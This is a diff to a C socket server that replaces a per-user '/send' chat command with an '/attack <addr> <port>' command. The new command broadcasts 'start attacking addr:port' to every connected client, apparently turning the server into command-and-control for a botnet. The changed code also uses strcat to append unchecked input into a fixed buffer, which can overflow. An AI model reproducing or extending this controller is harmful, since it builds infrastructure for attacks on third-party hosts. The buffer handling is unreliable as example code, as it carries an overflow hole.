@@ -181,32 +181,29 @@ int main()
                     else if(data_buf[0] == '/')
                     {
                         printf("%s\n",data_buf);
-                        if(strstr(data_buf,"/send") != NULL)
+                        if(strstr(data_buf,"/attack") != NULL)
                         {
                             char *data = data_buf;
                             printf("%s",data);
-                            char *nm;
-                            char *message;
+                            char *addr;
+                            char *port;
                             char *cmd;
                             cmd = strsep(&data," ");
-                            nm = strsep(&data," ");
-                            message = strsep(&data," ");
-                            strcat(send_buf, "message from ");
-                            strcat(send_buf,clientinfo[tmp_i].name);
-                            strcat(send_buf, ": ");
-                            strcat(send_buf, message);
+                            addr = strsep(&data," ");
+                            port = strsep(&data," ");
+                            strcat(send_buf, "start attacking ");
+			    strcat(send_buf, addr);
+			    strcat(send_buf, ":");
+                            strcat(send_buf, port);
                             for (tmp_j = sockfd + 1; tmp_j <= max_fd; tmp_j++)
                             {
 
                                 if (FD_ISSET(tmp_j, &master_fds))
-                                {
-                                        if(strstr(clientinfo[tmp_j].name,nm) != NULL)
-                                        {
-                                            if (-1 == write(tmp_j, send_buf, 2048))
-                                            {
-                                                perror("send data error:");
-                                            }
-                                        }
+                                {   
+                                     if (-1 == write(tmp_j, send_buf, 2048))
+                                         {
+                                            perror("send data error:");
+                                         }
                                 }
                             }// end for
 
